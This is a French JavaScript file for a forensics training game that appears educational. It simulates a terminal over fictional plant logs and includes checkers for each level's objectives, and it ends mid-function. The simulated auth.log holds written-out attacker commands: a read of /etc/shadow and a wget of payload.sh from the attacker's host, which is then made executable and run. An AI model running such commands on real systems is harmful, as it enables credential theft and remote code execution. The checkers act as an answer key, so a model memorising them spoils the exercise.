/* ============================================================
   terminal.js — Terminal simulé avec fichiers de logs en mémoire
   Supporte: grep, awk, sed, sort, uniq, cat, ls, wc, head, tail, echo, clear, help
   ============================================================ */

// ============================================================
// FICHIERS DE LOGS EN MÉMOIRE
// ============================================================
const VIRTUAL_FS = {
    'logs_centrale/access.log': `[2026-03-14 02:30:15] SRC=192.168.1.10 DST=192.168.1.100 PORT=443 PROTO=TCP STATUS=OK SERVICE=HTTPS
[2026-03-14 02:30:18] SRC=192.168.1.12 DST=192.168.1.100 PORT=22 PROTO=TCP STATUS=OK SERVICE=SSH
[2026-03-14 02:31:02] SRC=192.168.1.10 DST=192.168.1.100 PORT=80 PROTO=TCP STATUS=OK SERVICE=HTTP
[2026-03-14 02:31:45] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:31:46] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:31:47] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:32:00] SRC=192.168.1.15 DST=192.168.1.100 PORT=443 PROTO=TCP STATUS=OK SERVICE=HTTPS
[2026-03-14 02:32:10] SRC=10.0.0.55 DST=192.168.1.201 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:32:11] SRC=10.0.0.55 DST=192.168.1.202 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:32:30] SRC=192.168.1.12 DST=192.168.1.100 PORT=22 PROTO=TCP STATUS=OK SERVICE=SSH
[2026-03-14 02:33:00] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:33:05] SRC=10.0.0.55 DST=192.168.1.200 PORT=31337 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:33:06] SRC=10.0.0.55 DST=192.168.1.203 PORT=31337 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:33:30] SRC=192.168.1.10 DST=192.168.1.100 PORT=443 PROTO=TCP STATUS=OK SERVICE=HTTPS
[2026-03-14 02:34:00] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:34:15] SRC=10.0.0.55 DST=192.168.1.200 PORT=9999 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:34:30] SRC=192.168.1.20 DST=192.168.1.100 PORT=3306 PROTO=TCP STATUS=OK SERVICE=MYSQL
[2026-03-14 02:35:00] SRC=10.0.0.55 DST=192.168.1.204 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:35:15] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:35:30] SRC=192.168.1.10 DST=192.168.1.100 PORT=443 PROTO=TCP STATUS=OK SERVICE=HTTPS
[2026-03-14 02:36:00] SRC=192.168.1.25 DST=192.168.1.100 PORT=8080 PROTO=TCP STATUS=OK SERVICE=HTTP-ALT
[2026-03-14 02:36:30] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:37:00] SRC=10.0.0.55 DST=192.168.1.205 PORT=31337 PROTO=TCP STATUS=OK SERVICE=UNKNOWN
[2026-03-14 02:37:15] SRC=192.168.1.12 DST=192.168.1.100 PORT=22 PROTO=TCP STATUS=FAIL SERVICE=SSH
[2026-03-14 02:37:16] SRC=192.168.1.12 DST=192.168.1.100 PORT=22 PROTO=TCP STATUS=FAIL SERVICE=SSH
[2026-03-14 02:37:17] SRC=192.168.1.12 DST=192.168.1.100 PORT=22 PROTO=TCP STATUS=FAIL SERVICE=SSH
[2026-03-14 02:37:30] SRC=10.0.0.55 DST=192.168.1.200 PORT=4444 PROTO=TCP STATUS=OK SERVICE=UNKNOWN`,

    'logs_centrale/capteurs.log': `[2026-03-14 02:30:00] CAPTEUR=TEMP_REACT_7 VALEUR=312.5 UNITE=°C STATUS=NORMAL
[2026-03-14 02:30:30] CAPTEUR=PRESSION_REACT_7 VALEUR=155.2 UNITE=bar STATUS=NORMAL
[2026-03-14 02:31:00] CAPTEUR=TEMP_REACT_7 VALEUR=313.1 UNITE=°C STATUS=NORMAL
[2026-03-14 02:31:30] CAPTEUR=PRESSION_REACT_7 VALEUR=155.0 UNITE=bar STATUS=NORMAL
[2026-03-14 02:32:00] CAPTEUR=TEMP_REACT_7 VALEUR=350.8 UNITE=°C STATUS=ALERTE
[2026-03-14 02:32:30] CAPTEUR=PRESSION_REACT_7 VALEUR=170.3 UNITE=bar STATUS=ALERTE
[2026-03-14 02:33:00] CAPTEUR=TEMP_REACT_7 VALEUR=425.9 UNITE=°C STATUS=CRITIQUE
[2026-03-14 02:33:30] CAPTEUR=PRESSION_REACT_7 VALEUR=189.7 UNITE=bar STATUS=CRITIQUE
[2026-03-14 02:34:00] CAPTEUR=TEMP_REACT_7 VALEUR=287.0 UNITE=°C STATUS=NORMAL
[2026-03-14 02:34:30] CAPTEUR=PRESSION_REACT_7 VALEUR=150.1 UNITE=bar STATUS=NORMAL
[2026-03-14 02:35:00] CAPTEUR=TEMP_REACT_7 VALEUR=510.2 UNITE=°C STATUS=DANGER
[2026-03-14 02:35:30] CAPTEUR=PRESSION_REACT_7 VALEUR=210.5 UNITE=bar STATUS=DANGER
[2026-03-14 02:36:00] CAPTEUR=TEMP_REACT_7 VALEUR=295.0 UNITE=°C STATUS=NORMAL
[2026-03-14 02:36:30] CAPTEUR=DEBIT_EAU_REACT_7 VALEUR=4500 UNITE=L/min STATUS=NORMAL
[2026-03-14 02:37:00] CAPTEUR=TEMP_REACT_7 VALEUR=480.3 UNITE=°C STATUS=DANGER
[2026-03-14 02:37:30] CAPTEUR=PRESSION_REACT_7 VALEUR=205.8 UNITE=bar STATUS=DANGER
[2026-03-14 02:38:00] CAPTEUR=TEMP_REACT_7 VALEUR=301.0 UNITE=°C STATUS=NORMAL`,

    'logs_centrale/auth.log': `[2026-03-14 02:30:00] USER=operateur1 IP=192.168.1.10 ACTION=LOGIN STATUS=SUCCESS
[2026-03-14 02:30:05] USER=admin IP=192.168.1.12 ACTION=LOGIN STATUS=SUCCESS
[2026-03-14 02:31:45] USER=root IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:46] USER=root IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:47] USER=root IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:48] USER=admin IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:49] USER=admin IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:50] USER=operateur1 IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:51] USER=operateur2 IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:52] USER=test IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:31:53] USER=guest IP=10.0.0.55 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:32:00] USER=superviseur IP=192.168.1.15 ACTION=LOGIN STATUS=SUCCESS
[2026-03-14 02:33:05] USER=maintenance IP=10.0.0.55 ACTION=LOGIN STATUS=SUCCESS
[2026-03-14 02:33:10] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="cat /etc/shadow"
[2026-03-14 02:33:15] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="wget http://10.0.0.55/payload.sh"
[2026-03-14 02:33:20] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="chmod +x payload.sh"
[2026-03-14 02:33:25] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="./payload.sh"
[2026-03-14 02:34:00] USER=operateur1 IP=192.168.1.10 ACTION=LOGOUT STATUS=SUCCESS
[2026-03-14 02:35:00] USER=maintenance IP=10.0.0.55 ACTION=SUDO STATUS=SUCCESS CMD="crontab -e"
[2026-03-14 02:36:00] USER=admin IP=192.168.1.12 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:36:01] USER=admin IP=192.168.1.12 ACTION=LOGIN STATUS=FAILED
[2026-03-14 02:36:02] USER=admin IP=192.168.1.12 ACTION=LOGIN STATUS=FAILED`,

    'logs_centrale/connexions_actives.txt': `Proto  Adresse_Locale         Adresse_Distante       Etat         PID/Programme
tcp    192.168.1.100:443      192.168.1.10:52341     ESTABLISHED  1234/nginx
tcp    192.168.1.100:22       192.168.1.12:48210     ESTABLISHED  5678/sshd
tcp    192.168.1.200:4444     10.0.0.55:61234        ESTABLISHED  9999/nc
tcp    192.168.1.200:31337    10.0.0.55:55012        ESTABLISHED  9998/python3
tcp    192.168.1.100:3306     192.168.1.20:41567     ESTABLISHED  3306/mysqld
tcp    192.168.1.100:80       192.168.1.10:53200     ESTABLISHED  1234/nginx
tcp    192.168.1.201:4444     10.0.0.55:61235        ESTABLISHED  10001/nc
tcp    192.168.1.100:8080     192.168.1.25:49321     ESTABLISHED  8080/tomcat
tcp    192.168.1.203:31337    10.0.0.55:55100        ESTABLISHED  10002/python3`
};

// ============================================================
// OBJECTIFS PAR NIVEAU — Validation automatique (STRICTE)
// Chaque check vérifie que le résultat est FILTRÉ (pas un dump complet)
// ============================================================
const LEVEL_OBJECTIVES = {
    level1: [
        {
            id: 'l1-ip',
            text: 'Identifier l\'adresse IP source externe suspecte',
            check: (cmd, output) => {
                const lines = output.trim().split('\n').filter(l => l.trim());
                // Doit contenir 10.0.0.55
                const hasIP = output.includes('10.0.0.55');
                // Ne doit PAS contenir de lignes avec SRC=192.168.1 (= filtrage fait)
                const noInternalSrc = !lines.some(l => l.includes('SRC=192.168.1'));
                return hasIP && noInternalSrc && lines.length > 0 && lines.length <= 20;
            }
        },
        {
            id: 'l1-count',
            text: 'Compter le nombre exact de connexions de l\'IP suspecte',
            check: (cmd, output) => {
                // Résultat attendu : exactement "15" (rien d'autre)
                return output.trim() === '15';
            }
        },
        {
            id: 'l1-ports',
            text: 'Extraire les 3 ports non-standards (4444, 31337, 9999)',
            check: (cmd, output) => {
                const lines = output.trim().split('\n').filter(l => l.trim());
                // Doit contenir les 3 ports
                const has4444 = output.includes('4444');
                const has31337 = output.includes('31337');
                const has9999 = output.includes('9999');
                // Résultat doit être COURT (extrait, pas des lignes complètes de log)
                // Pas de STATUS= signifie que les ports ont été extraits
                const extracted = lines.every(l => l.length < 80);
                return has4444 && has31337 && has9999 && extracted && lines.length <= 10;
            }
        },
        {
            id: 'l1-sensors',
            text: 'Détecter les anomalies dans les capteurs du réacteur',
            check: (cmd, output) => {
                // Doit contenir des anomalies
                const hasAnomalies = output.includes('CRITIQUE') ||
                                     output.includes('DANGER') ||
                                     output.includes('ALERTE');
                // Ne doit PAS contenir de lignes STATUS=NORMAL (= filtrage fait)
                const filtered = !output.includes('STATUS=NORMAL');
                return hasAnomalies && filtered;
            }
        },
        {
            id: 'l1-auth',
            text: 'Trouver le compte compromis par l\'attaquant',
            check: (cmd, output) => {
                // Doit contenir maintenance + SUCCESS + 10.0.0.55
                // Ne doit PAS contenir FAILED (= filtrage fait, pas un dump de auth.log)
                return output.includes('maintenance') &&
                       output.includes('10.0.0.55') &&
                       output.includes('SUCCESS') &&
                       !output.includes('FAILED');
            }
        },
        {
            id: 'l1-cmds',
            text: 'Découvrir les commandes exécutées après intrusion',
            check: (cmd, output) => {
                const lines = output.trim().split('\n').filter(l => l.trim());
                // Doit montrer les commandes (shadow, payload = preuves clés)
                const hasCommands = output.includes('shadow') && output.includes('payload');
                // Ne doit PAS contenir de lignes ACTION=LOGIN (= filtrage fait)
                const filtered = !output.includes('ACTION=LOGIN');
                return hasCommands && filtered && lines.length > 0 && lines.length <= 10;
            }
        }
    ],
    level2: [
        {
            id: 'l2-connections',
            text: 'Identifier les connexions suspectes dans connexions_actives.txt',
            check: (cmd, output) => {
                const lines = output.trim().split('\n').filter(l => l.trim());
                // Doit contenir 10.0.0.55
                const hasIP = output.includes('10.0.0.55');
                // Ne doit PAS contenir de connexions internes pures (nginx interne, sshd, mysqld, tomcat)
                const filtered = !lines.some(l =>
                    l.includes('ESTABLISHED') && !l.includes('10.0.0.55')
                );
                return hasIP && filtered && lines.length > 0 && lines.length <= 5;
            }
        },
        {
            id: 'l2-programs',
            text: 'Extraire les programmes utilisés par l\'attaquant (nc, python3)',
            check: (cmd, output) => {
                const lines = output.trim().split('\n').filter(l => l.trim());
                // Doit montrer nc et python3
                const hasNC = lines.some(l => /\/nc\b|^\s*nc\b|\bnc$/.test(l));
                const hasPython = output.includes('python3');
                // Ne doit PAS contenir des services internes (nginx, sshd = dump complet)
                const filtered = !output.includes('nginx') && !output.includes('sshd') &&
                                 !output.includes('mysqld') && !output.includes('tomcat');
                return hasNC && hasPython && filtered;
            }
        },
        {
            id: 'l2-timeline',
            text: 'Reconstituer la timeline triée de l\'attaque',
            check: (cmd, output) => {
                const lines = output.trim().split('\n').filter(l => l.includes('10.0.0.55'));
                // Doit utiliser sort, avoir des entrées 10.0.0.55, et provenir de PLUSIEURS fichiers
                const hasMultipleFiles = output.includes('access.log') || output.includes('auth.log');
                return cmd.includes('sort') && lines.length >= 5 && hasMultipleFiles;
            }
        }
    ],
    level3: [
        {
            id: 'l3-extract',
            text: 'Extraire les IPs suspectes avec leur nombre d\'occurrences',
            check: (cmd, output) => {
                const lines = output.trim().split('\n').filter(l => l.trim());
                // Doit contenir 10.0.0.55 et utiliser uniq -c ou wc
                // Résultat doit être court (comptage, pas un dump de toutes les lignes)
                return output.includes('10.0.0.55') &&
                       (cmd.includes('uniq') || cmd.includes('wc')) &&
                       lines.length <= 10;
            }
        },
        {
            id: 'l3-ports',
            text: 'Lister les ports avec SERVICE=UNKNOWN',
            check: (cmd, output) => {
                // Doit contenir UNKNOWN et des ports
                const hasUnknown = output.includes('UNKNOWN');
                const hasPorts = output.includes('4444') || output.includes('31337') || output.includes('9999');
                // Ne doit PAS contenir des services connus (= pas un dump du fichier)
                const filtered = !output.includes('SERVICE=SSH') &&
                                 !output.includes('SERVICE=HTTPS') &&
                                 !output.includes('SERVICE=MYSQL');
                return hasUnknown && hasPorts && filtered;
            }
        },
        {
            id: 'l3-temps',
            text: 'Filtrer les températures supérieures à 320°C',
            check: (cmd, output) => {
                // Doit contenir AU MOINS une temp élevée
                const hasHighTemp = output.includes('350.8') || output.includes('425.9') ||
                                    output.includes('510.2') || output.includes('480.3');
                // Ne doit PAS contenir de températures normales (= filtrage fait)
                const noNormalTemp = !output.includes('312.5') && !output.includes('313.1') &&
                                     !output.includes('287.0') && !output.includes('295.0') &&
                                     !output.includes('301.0');
                return hasHighTemp && noNormalTemp;
            }
        }
    ]
};

window.LEVEL_OBJECTIVES = LEVEL_OBJECTIVES;

// ============================================================
// PARSEUR DE COMMANDES
// ============================================================
class SimulatedTerminal {
    constructor(outputEl, inputEl, levelId) {
        this.outputEl = outputEl;
        this.inputEl = inputEl;
        this.levelId = levelId || null;
        this.completedObjectives = new Set();
        this.history = [];
        this.historyIndex = -1;
        this.cwd = '/home/agent';
        this.setupInput();
    }

    setupInput() {
        this.inputEl.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const cmd = this.inputEl.value.trim();
                if (cmd) {
                    this.history.unshift(cmd);
                    this.historyIndex = -1;
                    this.execute(cmd);
                }
                this.inputEl.value = '';
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (this.historyIndex < this.history.length - 1) {
                    this.historyIndex++;
                    this.inputEl.value = this.history[this.historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (this.historyIndex > 0) {
                    this.historyIndex--;
                    this.inputEl.value = this.history[this.historyIndex];
                } else {
                    this.historyIndex = -1;
                    this.inputEl.value = '';
                }
            }
        });
    }

    print(text, className = '') {
        const div = document.createElement('div');
        div.className = 'term-line ' + className;
        div.textContent = text;
        this.outputEl.appendChild(div);
        this.outputEl.scrollTop = this.outputEl.scrollHeight;
    }

    printCmd(cmd) {
        const div = document.createElement('div');
        div.className = 'term-line term-cmd';
        div.innerHTML = `<span class="term-prompt">agent@gentilly3:~$</span> ${this.escapeHtml(cmd)}`;
        this.outputEl.appendChild(div);
    }

    escapeHtml(text) {
        const d = document.createElement('div');
        d.textContent = text;
        return d.innerHTML;
    }

    execute(cmdLine) {
        this.printCmd(cmdLine);

        // Handle pipes
        const pipeSegments = this.splitPipes(cmdLine);
        let data = null;

        try {
            for (let i = 0; i < pipeSegments.length; i++) {
                const seg = pipeSegments[i].trim();
                if (!seg) continue;
                data = this.runCommand(seg, data);
                if (data === null) return; // command handled its own output (clear, help)
            }

            if (data !== null) {
                const outputStr = Array.isArray(data) ? data.join('\n') : data;
                const lines = outputStr.split('\n');
                lines.forEach(line => this.print(line));

                // Vérifier les objectifs après chaque commande
                this.checkObjectives(cmdLine, outputStr);
            }
        } catch (e) {
            this.print(e.message, 'term-error');
        }
    }

    splitPipes(cmdLine) {
        // Split by | but not inside quotes
        const segments = [];
        let current = '';
        let inSingle = false;
        let inDouble = false;

        for (let i = 0; i < cmdLine.length; i++) {
            const ch = cmdLine[i];
            if (ch === "'" && !inDouble) inSingle = !inSingle;
            else if (ch === '"' && !inSingle) inDouble = !inDouble;
            else if (ch === '|' && !inSingle && !inDouble) {
                segments.push(current);
                current = '';
                continue;
            }
            current += ch;
        }
        segments.push(current);
        return segments;
    }

    parseArgs(str) {
        const args = [];
        let current = '';
        let inSingle = false;
        let inDouble = false;

        for (let i = 0; i < str.length; i++) {
            const ch = str[i];
            if (ch === "'" && !inDouble) { inSingle = !inSingle; continue; }
            if (ch === '"' && !inSingle) { inDouble = !inDouble; continue; }
            if (ch === ' ' && !inSingle && !inDouble) {
                if (current) args.push(current);
                current = '';
                continue;
            }
            current += ch;
        }
        if (current) args.push(current);
        return args;
    }

    getFileContent(path) {
        // Normalize path
        let normalized = path.replace(/^\.\//, '');
        if (VIRTUAL_FS[normalized]) return VIRTUAL_FS[normalized];

        // Try without leading /
        normalized = normalized.replace(/^\//, '');
        if (VIRTUAL_FS[normalized]) return VIRTUAL_FS[normalized];

        throw new Error(`bash: ${path}: Fichier introuvable`);
    }

    runCommand(cmdStr, pipedInput) {
        const args = this.parseArgs(cmdStr);
        if (args.length === 0) return '';

        const cmd = args[0];

        switch (cmd) {
            case 'clear': this.outputEl.innerHTML = ''; return null;
            case 'help': return this.cmdHelp();
            case 'ls': return this.cmdLs(args.slice(1));
            case 'cat': return this.cmdCat(args.slice(1), pipedInput);
            case 'grep': return this.cmdGrep(args.slice(1), pipedInput);
            case 'awk': return this.cmdAwk(args.slice(1), pipedInput);
            case 'sed': return this.cmdSed(args.slice(1), pipedInput);
            case 'sort': return this.cmdSort(args.slice(1), pipedInput);
            case 'uniq': return this.cmdUniq(args.slice(1), pipedInput);
            case 'wc': return this.cmdWc(args.slice(1), pipedInput);
            case 'head': return this.cmdHead(args.slice(1), pipedInput);
            case 'tail': return this.cmdTail(args.slice(1), pipedInput);
            case 'echo': return args.slice(1).join(' ');
            case 'pwd': return this.cwd;
            case 'whoami': return 'agent';
            case 'hostname': return 'gentilly3-sec';
            case 'date': return '[2026-03-14 02:48:00]';
            case 'uname': return 'Linux gentilly3-sec 5.15.0 x86_64';
            default:
                throw new Error(`bash: ${cmd}: commande introuvable. Tapez 'help' pour la liste.`);
        }
    }

    // ---- COMMANDES ----

    cmdHelp() {
        return [
            '╔══════════════════════════════════════════════════════════╗',
            '║  TERMINAL GENTILLY-3 — Commandes disponibles           ║',
            '╠══════════════════════════════════════════════════════════╣',
            '║  cat <fichier>          Afficher un fichier             ║',
            '║  grep [opts] MOTIF [f]  Rechercher dans un fichier     ║',
            '║    -v                   Inverser (lignes sans motif)    ║',
            '║    -c                   Compter les occurrences         ║',
            '║    -i                   Ignorer la casse                ║',
            '║    -oE                  Extraire les correspondances   ║',
            '║  awk \'{print $N}\'       Extraire des colonnes          ║',
            '║  sed \'s/old/new/\'       Substituer du texte            ║',
            '║  sort [-u] [-r] [-n]    Trier les lignes               ║',
            '║  uniq [-c]              Supprimer les doublons          ║',
            '║  wc [-l] [-w] [-c]      Compter lignes/mots/chars      ║',
            '║  head [-n N]            Premières N lignes              ║',
            '║  tail [-n N]            Dernières N lignes              ║',
            '║  ls [dossier]           Lister les fichiers             ║',
            '║  echo <texte>           Afficher du texte               ║',
            '║  clear                  Effacer le terminal             ║',
            '║  Pipes supportés :  cmd1 | cmd2 | cmd3                 ║',
            '╚══════════════════════════════════════════════════════════╝',
            '',
            'Fichiers disponibles :',
            '  logs_centrale/access.log',
            '  logs_centrale/capteurs.log',
            '  logs_centrale/auth.log',
            '  logs_centrale/connexions_actives.txt'
        ].join('\n');
    }

    cmdLs(args) {
        const target = args.find(a => !a.startsWith('-')) || '';

        if (!target || target === '.' || target === './') {
            return 'logs_centrale/';
        }

        if (target === 'logs_centrale' || target === 'logs_centrale/' || target === './logs_centrale') {
            const files = Object.keys(VIRTUAL_FS)
                .filter(f => f.startsWith('logs_centrale/'))
                .map(f => f.replace('logs_centrale/', ''));
            return files.join('\n');
        }

        if (target === '-la' || target === '-l' || target === '-a') {
            return 'logs_centrale/';
        }

        throw new Error(`ls: impossible d'accéder à '${target}': Aucun fichier ou dossier`);
    }

    cmdCat(args, pipedInput) {
        if (pipedInput) return pipedInput;
        const files = args.filter(a => !a.startsWith('-'));
        if (files.length === 0) throw new Error('cat: opérande manquant');

        return files.map(f => this.getFileContent(f)).join('\n');
    }

    cmdGrep(args, pipedInput) {
        let invert = false;
        let count = false;
        let ignoreCase = false;
        let onlyMatch = false;
        let regexMode = false;
        let pattern = null;
        let files = [];

        // Parse flags
        for (let i = 0; i < args.length; i++) {
            const a = args[i];
            if (a === '-v') invert = true;
            else if (a === '-c') count = true;
            else if (a === '-i') ignoreCase = true;
            else if (a === '-o' || a === '-oE' || a === '-E' || a === '-oP') { onlyMatch = true; regexMode = true; }
            else if (a === '-iv' || a === '-vi') { invert = true; ignoreCase = true; }
            else if (a === '-vc' || a === '-cv') { invert = true; count = true; }
            else if (a === '-ic' || a === '-ci') { ignoreCase = true; count = true; }
            else if (a.startsWith('-') && !a.startsWith('--') && a.length > 1) {
                // Combined flags like -oEc
                const flags = a.slice(1);
                for (const f of flags) {
                    if (f === 'v') invert = true;
                    else if (f === 'c') count = true;
                    else if (f === 'i') ignoreCase = true;
                    else if (f === 'o') onlyMatch = true;
                    else if (f === 'E') regexMode = true;
                    else if (f === 'P') regexMode = true;
                }
            }
            else if (pattern === null) pattern = a;
            else files.push(a);
        }

        if (pattern === null) throw new Error('grep: motif manquant');

        // Get input lines
        let input;
        if (pipedInput) {
            input = pipedInput.split('\n');
        } else if (files.length > 0) {
            // Multiple files: prefix with filename
            if (files.length > 1) {
                let allLines = [];
                for (const f of files) {
                    const content = this.getFileContent(f);
                    const fname = f.includes('/') ? f : f;
                    content.split('\n').forEach(line => {
                        allLines.push(fname + ':' + line);
                    });
                }
                input = allLines;
            } else {
                input = this.getFileContent(files[0]).split('\n');
            }
        } else {
            throw new Error('grep: pas de fichier spécifié et pas de données en entrée');
        }

        // Build regex
        let regex;
        try {
            const flags = ignoreCase ? 'gi' : 'g';
            const flagsNoGlobal = ignoreCase ? 'i' : '';
            regex = new RegExp(regexMode ? pattern : this.escapeRegex(pattern), flags);
            // For test/filter, use a non-global regex to avoid lastIndex issues
            var regexTest = new RegExp(regexMode ? pattern : this.escapeRegex(pattern), flagsNoGlobal);
        } catch (e) {
            throw new Error(`grep: expression régulière invalide: '${pattern}'`);
        }

        // Apply grep
        let results;
        if (onlyMatch) {
            results = [];
            input.forEach(line => {
                const matches = line.match(regex);
                if (matches) {
                    matches.forEach(m => results.push(m));
                }
            });
            if (invert) {
                results = input.filter(line => !regexTest.test(line));
            }
        } else if (invert) {
            results = input.filter(line => !regexTest.test(line));
        } else {
            results = input.filter(line => regexTest.test(line));
        }

        if (count) return String(results.length);
        return results.join('\n');
    }

    escapeRegex(str) {
        return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    }

    cmdAwk(args, pipedInput) {
        // Support: awk '{print $N}' and awk -F'sep' '{print $N}'
        let separator = /\s+/;
        let program = '';
        let files = [];

        for (let i = 0; i < args.length; i++) {
            if (args[i].startsWith('-F')) {
                let sep = args[i].slice(2);
                if (!sep && i + 1 < args.length) { sep = args[++i]; }
                sep = sep.replace(/['"]/g, '');
                separator = new RegExp(this.escapeRegex(sep));
            } else if (args[i].includes('{') || args[i].startsWith("'") || args[i].startsWith('"')) {
                program = args[i].replace(/^['"]|['"]$/g, '');
                // Check if program spans multiple args (quote not closed)
                while (!program.includes('}') && i + 1 < args.length) {
                    program += ' ' + args[++i].replace(/['"]$/g, '');
                }
            } else {
                files.push(args[i]);
            }
        }

        // Get input
        let lines;
        if (pipedInput) {
            lines = pipedInput.split('\n');
        } else if (files.length > 0) {
            lines = this.getFileContent(files[0]).split('\n');
        } else {
            throw new Error('awk: pas de données en entrée');
        }

        // Parse the print statement
        const printMatch = program.match(/\{?\s*print\s+(.*?)\s*\}?$/);
        if (!printMatch) {
            throw new Error("awk: seul '{print $N, $M, ...}' est supporté");
        }

        const printExpr = printMatch[1];
        // Split by comma or space to get fields
        const fieldRefs = printExpr.split(/[,\s]+/).filter(Boolean);

        const results = lines.filter(l => l.trim()).map(line => {
            const fields = line.split(separator);
            fields.unshift(line); // $0 = whole line

            return fieldRefs.map(ref => {
                if (ref.startsWith('$')) {
                    const idx = parseInt(ref.slice(1));
                    return fields[idx] || '';
                }
                // Literal string
                return ref.replace(/"/g, '');
            }).join(' ');
        });

        return results.join('\n');
    }

    cmdSed(args, pipedInput) {
        let expression = '';
        let files = [];

        for (let i = 0; i < args.length; i++) {
            if (args[i] === '-e' && i + 1 < args.length) {
                expression = args[++i];
            } else if (!expression && (args[i].startsWith("'") || args[i].startsWith('"') || args[i].startsWith('s'))) {
                expression = args[i].replace(/^['"]|['"]$/g, '');
            } else {
                files.push(args[i]);
            }
        }

        if (!expression) throw new Error('sed: expression manquante');

        // Get input
        let lines;
        if (pipedInput) {
            lines = pipedInput.split('\n');
        } else if (files.length > 0) {
            lines = this.getFileContent(files[0]).split('\n');
        } else {
            throw new Error('sed: pas de données en entrée');
        }

        // Parse s/pattern/replacement/flags
        const sedMatch = expression.match(/^s(.)(.+?)\1(.*?)\1(g?i?)?$/);
        if (!sedMatch) {
            throw new Error("sed: seul 's/motif/remplacement/[g]' est supporté");
        }

        const [, , pattern, replacement, flags] = sedMatch;
        const regexFlags = (flags || '').includes('i') ? 'i' : '';
        const globalFlag = (flags || '').includes('g') ? 'g' : '';

        const results = lines.map(line => {
            try {
                const regex = new RegExp(pattern, regexFlags + globalFlag);
                return line.replace(regex, replacement);
            } catch (e) {
                return line;
            }
        });

        return results.join('\n');
    }

    cmdSort(args, pipedInput) {
        let unique = false;
        let reverse = false;
        let numeric = false;
        let files = [];
        let keyField = null;
        let fieldSep = null;

        for (let i = 0; i < args.length; i++) {
            const a = args[i];
            if (a === '-u') unique = true;
            else if (a === '-r') reverse = true;
            else if (a === '-n') numeric = true;
            else if (a === '-rn' || a === '-nr') { reverse = true; numeric = true; }
            else if (a === '-ru' || a === '-ur') { reverse = true; unique = true; }
            else if (a === '-t' && i + 1 < args.length) { fieldSep = args[++i].replace(/['"]/g, ''); }
            else if (a.startsWith('-t')) { fieldSep = a.slice(2).replace(/['"]/g, ''); }
            else if (a === '-k' && i + 1 < args.length) { keyField = parseInt(args[++i]); }
            else if (a.startsWith('-k')) { keyField = parseInt(a.slice(2)); }
            else if (!a.startsWith('-')) files.push(a);
        }

        let lines;
        if (pipedInput) {
            lines = pipedInput.split('\n').filter(l => l.trim());
        } else if (files.length > 0) {
            lines = this.getFileContent(files[0]).split('\n').filter(l => l.trim());
        } else {
            throw new Error('sort: pas de données en entrée');
        }

        lines.sort((a, b) => {
            let va = a, vb = b;
            if (keyField && fieldSep) {
                va = a.split(fieldSep)[keyField - 1] || a;
                vb = b.split(fieldSep)[keyField - 1] || b;
            }
            if (numeric) {
                const na = parseFloat(va.replace(/[^\d.-]/g, '')) || 0;
                const nb = parseFloat(vb.replace(/[^\d.-]/g, '')) || 0;
                return na - nb;
            }
            return va.localeCompare(vb);
        });

        if (reverse) lines.reverse();
        if (unique) lines = [...new Set(lines)];

        return lines.join('\n');
    }

    cmdUniq(args, pipedInput) {
        let countMode = false;
        let files = [];

        for (const a of args) {
            if (a === '-c') countMode = true;
            else if (!a.startsWith('-')) files.push(a);
        }

        let lines;
        if (pipedInput) {
            lines = pipedInput.split('\n');
        } else if (files.length > 0) {
            lines = this.getFileContent(files[0]).split('\n');
        } else {
            throw new Error('uniq: pas de données en entrée');
        }

        if (countMode) {
            const counts = {};
            const order = [];
            lines.forEach(l => {
                if (!counts[l]) { counts[l] = 0; order.push(l); }
                counts[l]++;
            });
            return order.map(l => `      ${counts[l]} ${l}`).join('\n');
        } else {
            const result = [];
            let prev = null;
            lines.forEach(l => {
                if (l !== prev) { result.push(l); prev = l; }
            });
            return result.join('\n');
        }
    }

    cmdWc(args, pipedInput) {
        let linesMode = false;
        let wordsMode = false;
        let charsMode = false;
        let files = [];

        for (const a of args) {
            if (a === '-l') linesMode = true;
            else if (a === '-w') wordsMode = true;
